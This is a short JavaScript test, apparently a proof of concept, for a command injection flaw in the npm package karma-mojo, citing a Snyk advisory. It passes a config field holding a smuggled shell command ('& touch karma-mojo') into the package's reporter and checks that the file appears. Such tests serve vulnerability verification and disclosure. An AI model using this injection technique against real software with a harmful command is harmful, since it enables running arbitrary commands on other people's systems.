//https://snyk.io/vuln/SNYK-JS-KARMAMOJO-564260
test("Command Injection in karma-mojo", () => 
{
	const root = require("karma-mojo");
	const fs = require('fs');
	const path = './karma-mojo';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let config = {
		runnerPath: './karma.log',
	   grep: "\"& touch karma-mojo\"",
	   grepDir:"",
	   length: 1
	}
	try{
		root['reporter:mojo'][1]('',config, '', {'create': function(){}});
	}
	catch(error)
	{
		console.log("error")
	}
	finally{

		sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
	}	
	
});
